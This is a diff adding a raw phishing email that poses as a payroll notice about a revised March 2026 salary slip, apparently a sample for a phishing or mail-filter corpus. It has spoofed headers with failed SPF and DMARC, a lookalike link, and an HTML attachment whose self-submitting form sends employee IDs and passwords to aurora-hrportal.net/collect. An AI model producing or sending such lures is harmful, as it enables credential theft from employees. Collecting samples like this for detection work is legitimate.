@@ -1,0 +1,28 @@
+Received: from mail.hydrapey.net (45.142.213.107) by mx.auroralogistics.in with ESMTPS id 8f2c33e8
+Received-SPF: fail (domain owner discourages this sender) client-ip=45.142.213.107;
+Authentication-Results: mx.auroralogistics.in; spf=fail smtp.mailfrom=auroralogistics.in; dkim=none; dmarc=fail (p=none)
+X-Mailer: PHPMailer 6.8.0
+Reply-To: payroll.verify@aurora-hrportal.net
+From: Payroll Team <payroll@auroralogistics.in>
+To: r.desai@auroralogistics.in
+Date: Sat, 14 Mar 2026 09:12:19 +0530
+Subject: Revised salary slip - Mar 2026
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="hydra-b-3311"
+
+--hydra-b-3311
+Content-Type: text/html; charset=UTF-8
+
+<p>Dear Rohan,</p>
+<p>Your March salary slip has been revised after the payroll correction. Review and e-sign here:</p>
+<p><a href="http://aurora-hrportal.net/payslip?u=r.desai@auroralogistics.in">View revised slip</a></p>
+--hydra-b-3311
+Content-Type: text/html; name="SalarySlip_Mar2026.html"
+Content-Disposition: attachment; filename="SalarySlip_Mar2026.html"
+
+<html><body onload="document.getElementById('f').submit()">
+<form id="f" method="POST" action="http://aurora-hrportal.net/collect">
+Employee ID: <input name="empid"/><br/>Password: <input name="pw" type="password"/><br/>
+<input type="submit" value="View slip"/>
+</form></body></html>
+--hydra-b-3311--
